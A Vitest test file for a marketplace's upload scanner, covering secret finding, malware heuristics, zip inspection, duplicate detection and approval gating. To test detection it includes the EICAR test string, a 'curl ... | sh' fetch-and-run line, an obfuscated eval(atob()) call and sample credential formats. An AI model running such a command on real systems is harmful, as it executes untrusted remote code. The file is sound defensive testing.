import { zipSync, strToU8 } from 'fflate';
import { describe, expect, it } from 'vitest';
import { findSecrets, inspect, inspectBytes, similarity } from '@/lib/scan/engine';
import { approvalBlock, localScanner, runScan, summarise, type Deps, type ScanResult } from '@/lib/scan';

const zip = (files: Record<string, string | Uint8Array>) => zipSync(Object.fromEntries(Object.entries(files).map(([k, v]) => [k, typeof v === 'string' ? strToU8(v) : v])));
const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
const jwt = (payload: object) => `eyJhbGciOiJIUzI1NiJ9.${Buffer.from(JSON.stringify(payload)).toString('base64url')}.c2lnbmF0dXJlMTIzNDU2`;

describe('secrets in code', () => {
  it('finds the common ones and shows only the start of each', () => {
    const text = `const aws = "AKIAIOSFODNN7EXAMPLE";\nstripe: sk_live_51Habcdefghijklmnop\nconst api_key = "abcd1234efgh5678ijkl";\n-----BEGIN RSA PRIVATE KEY-----`;
    const kinds = findSecrets(text, 'a.js').map((h) => h.kind);
    expect(kinds).toEqual(expect.arrayContaining(['AWS access key', 'Stripe live key', 'hard-coded secret', 'private key']));
    for (const h of findSecrets(text, 'a.js')) expect(h.sample.length).toBeLessThan(40);
    expect(JSON.stringify(findSecrets(text, 'a.js'))).not.toContain('AKIAIOSFODNN7EXAMPLE');
  });
  it('a database admin key is caught by what it says, an ordinary JWT is not', () => {
    expect(findSecrets(`const k = "${jwt({ role: 'service_role' })}"`, 'x.js').map((h) => h.kind)).toContain('database admin key (service_role)');
    expect(findSecrets(`const k = "${jwt({ role: 'anon' })}"`, 'x.js')).toEqual([]);
  });
  it('plain code and normal words are not flagged', () => {
    expect(findSecrets('const password = getPassword(); // ask the user\nconst token = req.headers.get("x");', 'a.js')).toEqual([]);
  });
});

describe('malware heuristics', () => {
  it('the standard test virus is infected; common tricks and programs are suspicious; plain code is clean', () => {
    expect(inspectBytes('t.txt', strToU8(EICAR), EICAR).status).toBe('infected');
    expect(inspectBytes('a.js', strToU8('x'), 'eval(atob("ZG9TdHVmZigp"))').status).toBe('suspicious');
    expect(inspectBytes('a.sh', strToU8('x'), 'curl http://x.example/i.sh | sh').status).toBe('suspicious');
    expect(inspectBytes('setup.exe', strToU8('hello'), null).status).toBe('suspicious');
    expect(inspectBytes('pretty.png', Uint8Array.from([0x4d, 0x5a, 0x90, 0, 3, 0, 0, 0]), null).detail[0]).toMatch(/Windows program with another name/);
    expect(inspectBytes('app.js', strToU8('console.log(1)'), 'console.log(1)')).toEqual({ status: 'clean', detail: [] });
  });
  it('looks inside a zip, finds a licence file, a pasted secret and a hidden program', () => {
    const r = inspect(zip({ 'plugin/index.js': 'const key = "sk_live_51Habcdefghijklmnop";', 'plugin/LICENSE': 'MIT', 'plugin/bin/helper.exe': 'MZ' }), 'plugin.zip');
    expect(r.kind).toBe('archive');
    expect(r.files).toBe(3);
    expect(r.licenceFile).toBe(true);
    expect(r.secrets.map((s) => s.file)).toEqual(['plugin/index.js']);
    expect(r.malware.status).toBe('suspicious');
    expect(inspect(zip({ 'a.js': 'ok' }), 'a.zip').licenceFile).toBe(false);
  });
  it('a broken or fake zip is "unknown", never "clean"', () => {
    const r = inspect(Uint8Array.from([0x50, 0x4b, 1, 2, 3, 4, 5, 6]), 'x.zip');
    expect(r.kind).toBe('unreadable');
    expect(r.malware.status).toBe('unknown');
  });
});

describe('how alike two listings are', () => {
  it('the same words are 1, different ones near 0, a light rewrite in between', () => {
    const a = 'A ready made restaurant website with online menu, table booking and a photo gallery for your business';
    expect(similarity(a, a)).toBe(1);
    expect(similarity(a, 'Fitness tracker app with workouts, streaks and reminders for busy people every day')).toBeLessThan(0.05);
    const light = a.replace('ready made', 'ready-made').replace('photo gallery', 'photo gallery section');
    expect(similarity(a, light)).toBeGreaterThan(0.3);
    expect(similarity('', a)).toBe(0);
  });
});

const fileOf = (bytes: Uint8Array, name = 'plugin.zip') => ({ ok: true, status: 200, bytes, name });
const deps = (over: Partial<Deps> = {}): Deps => ({
  scanner: localScanner,
  fetchFile: async () => fileOf(zip({ 'index.js': 'console.log(1)', LICENSE: 'MIT' })),
  checkDemo: async () => true,
  others: async () => [],
  ...over,
});
let n = 0;
const input = (over: object = {}) => ({
  slug: `scan-${Date.now()}-${++n}`,
  description: 'A script that sends a weekly report of new leads to your inbox with a short summary of each one.',
  codeUrl: 'https://files.example/p.zip',
  demoUrl: 'https://demo.example/p',
  thirdPartyDeclared: true,
  needsLicenceFile: true,
  ...over,
});

describe('the listing scan', () => {
  it('a clean listing: no malware, no secrets, licence found, demo opens, original, version 1', async () => {
    const r = await runScan(input(), deps());
    expect(r.flags.malware.status).toBe('clean');
    expect(r.flags.secrets).toEqual([]);
    expect(r.flags.licenceFile).toBe(true);
    expect(r.flags.demoReachable).toBe(true);
    expect(r.flags.duplicate).toBeNull();
    expect(r.originality).toBe(1);
    expect(r.version).toBe(1);
    expect(r.flags.fileSha256).toMatch(/^[0-9a-f]{64}$/);
    expect(summarise(r).every((c) => c.tone === 'mint' || c.text.startsWith('Original'))).toBe(true);
  });
  it('a risky listing is flagged on every count and the summary says so in words', async () => {
    const bad = zip({ 'a.js': 'const k = "AKIAIOSFODNN7EXAMPLE"; eval(atob("x"))' });
    const r = await runScan(input(), deps({ fetchFile: async () => fileOf(bad), checkDemo: async () => false }));
    expect(r.flags.malware.status).toBe('suspicious');
    expect(r.flags.secrets.length).toBeGreaterThan(0);
    expect(r.flags.licenceFile).toBe(false);
    expect(r.flags.demoReachable).toBe(false);
    const text = summarise(r)
      .map((c) => c.text)
      .join(' | ');
    expect(text).toMatch(/Suspicious/);
    expect(text).toMatch(/secret/);
    expect(text).toMatch(/No licence file/);
    expect(text).toMatch(/Demo link does not open/);
  });
  it('a file that cannot be opened or is too big is "unknown" with the reason, never clean', async () => {
    const gone = await runScan(input(), deps({ fetchFile: async () => ({ ok: false, status: 404, name: 'p.zip' }) }));
    expect(gone.flags.malware.status).toBe('unknown');
    expect(gone.flags.fileNote).toMatch(/404/);
    const big = await runScan(input(), deps({ fetchFile: async () => ({ ok: true, status: 200, tooBig: true, name: 'p.zip' }) }));
    expect(big.flags.malware.status).toBe('unknown');
    expect(big.flags.fileNote).toMatch(/larger than the scan limit/);
  });
  it('the same file as another listing, or almost the same words, is a duplicate', async () => {
    const bytes = zip({ 'index.js': 'console.log("unique-' + Date.now() + '")', LICENSE: 'MIT' });
    const first = await runScan(input({ slug: 'dup-original-' + Date.now() }), deps({ fetchFile: async () => fileOf(bytes) }));
    const copyOfFile = await runScan(
      input({ description: 'Something quite different about invoices and reminders for small shops.' }),
      deps({ fetchFile: async () => fileOf(bytes), others: async () => [{ slug: 'orig', description: 'x y z', sha256: first.flags.fileSha256 }] }),
    );
    expect(copyOfFile.flags.duplicate).toMatchObject({ slug: 'orig', sameFile: true });
    expect(copyOfFile.originality).toBe(0);
    const sameWords = await runScan(input(), deps({ others: async () => [{ slug: 'twin', description: input().description }] }));
    expect(sameWords.flags.duplicate).toMatchObject({ slug: 'twin', similarity: 1, sameFile: false });
    expect(sameWords.originality).toBe(0);
  });
  it('a new version number only when the file really changed', async () => {
    const slug = `ver-${Date.now()}`;
    const a = zip({ 'a.js': 'one' }),
      b = zip({ 'a.js': 'two' });
    expect((await runScan(input({ slug }), deps({ fetchFile: async () => fileOf(a) }))).version).toBe(1);
    expect((await runScan(input({ slug }), deps({ fetchFile: async () => fileOf(a) }))).version).toBe(1);
    expect((await runScan(input({ slug }), deps({ fetchFile: async () => fileOf(b) }))).version).toBe(2);
    expect((await runScan(input({ slug }), deps({ fetchFile: async () => fileOf(a) }))).version).toBe(1);
  });
  it('a listing with no demo link or no file link is not marked as failing for it', async () => {
    const r = await runScan(input({ demoUrl: null, codeUrl: 'about:blank' }), deps());
    expect(r.flags.demoReachable).toBeNull();
    expect(r.flags.fileNote).toBe('No file link to scan.');
  });
});

describe('approval gate', () => {
  const scan = (status: 'clean' | 'infected' | 'unknown' | 'suspicious', scanner: string) =>
    ({
      slug: 's',
      version: 1,
      originality: 1,
      at: 0,
      flags: { malware: { status, detail: [] }, secrets: [], licenceFile: null, duplicate: null, demoReachable: null, scanner, fileSha256: 'a'.repeat(64) },
    }) as unknown as ScanResult;
  it('known malware always blocks', () => {
    expect(approvalBlock(scan('infected', 'clamav'), true, false)).toMatch(/malware/);
  });
  it('with the real-scanner switch on, files need a non-local scan', () => {
    expect(approvalBlock(null, true, true)).toMatch(/complete readable/);
    expect(approvalBlock(scan('clean', 'local'), true, true)).toMatch(/real scanner/);
    expect(approvalBlock(scan('clean', 'clamav'), true, true)).toBeNull();
  });
  it('missing, unscannable, suspicious, or corrupted files cannot pass a scan gate', () => {
    expect(approvalBlock(null, true, false)).toMatch(/complete readable/);
    expect(approvalBlock(scan('unknown', 'clamav'), true, true)).toMatch(/complete readable/);
    expect(approvalBlock(scan('suspicious', 'clamav'), true, false)).toMatch(/suspicious/);
    const missingHash = scan('clean', 'clamav');
    delete missingHash.flags.fileSha256;
    expect(approvalBlock(missingHash, true, true)).toMatch(/complete readable/);
  });
  it('production always requires real scanning, even when SCAN_REQUIRE_REAL=0', async () => {
    const { requireRealMalwareScanner } = await import('@/lib/scan');
    expect(requireRealMalwareScanner({ NODE_ENV: 'production', SCAN_REQUIRE_REAL: '0' })).toBe(true);
    expect(requireRealMalwareScanner({ NODE_ENV: 'production', LAUNCHBAY_DEMO: '1' })).toBe(false);
    expect(requireRealMalwareScanner({ NODE_ENV: 'test', SCAN_REQUIRE_REAL: '1' })).toBe(true);
  });
  it('listings without files, or with the switch off, are not held back', () => {
    expect(approvalBlock(null, false, true)).toBeNull();
    expect(approvalBlock(scan('clean', 'local'), true, false)).toBeNull();
  });
});
